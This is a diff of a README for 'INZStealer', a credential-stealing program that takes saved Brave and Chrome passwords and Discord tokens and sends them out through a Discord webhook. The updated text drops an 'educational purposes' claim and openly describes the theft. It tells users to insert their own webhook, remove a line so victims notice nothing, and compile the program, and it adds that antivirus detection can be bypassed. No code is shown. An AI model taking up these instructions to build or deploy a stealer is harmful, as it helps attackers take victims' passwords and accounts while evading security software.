@@ -1,21 +1,22 @@
 # THIS PROJECT IS BEING CURRENTLY REWRITTEN 
 
 # INZStealer
-A Brave Browser and a Discord Token grabber made purely for educational purposes!
-First , it gathers all passwords and tokens and then it send them via a Discord Webhook.
+This Program will collect and send via a webhook on Discord all your usernames and passwords stored in your Brave and Chrome browser.
+It will also steal your Discord Token.
 
 # Features
   - Chrome Support
+  - Brave Support
   - Discord Token Support
   
 # TODO
-  - Firefox Support
-  - 
-  
+  - Firefox Support ( will take a long time )
+  - Opera Support
 # HOW TO USE
   
   - Clone the repo
-  - Edit [this](https://github.com/InstinctEx/INZStealer/blob/26fbccc0392c0bba2652970df73fce65bb7873c3/INZStealer/Program.cs#L20) to your discord webhook
+  - Edit [this](https://github.com/InstinctEx/INZStealer/blob/0af614f41534abaf33f0ea8a28e0eb61e81372f8/INZStealer/Program.cs#L24) to your discord webhook
+  - If you want it to be stealthy, delete the open file [line](https://github.com/InstinctEx/INZStealer/blob/0af614f41534abaf33f0ea8a28e0eb61e81372f8/INZStealer/Program.cs#L67) so all passwords just don't pop up in your screen.
   - Compile it
   - Have Fun!
   
@@ -23,3 +24,6 @@ First , it gathers all passwords and tokens and then it send them via a Discord 
   
   Found something isn't working?
   Make a pull request!
+  
+  # Notes
+  This is now detected by Microsoft Security and probably other Antivirus Solutions. You can Bypass this with several ways which I am not going to explain here.
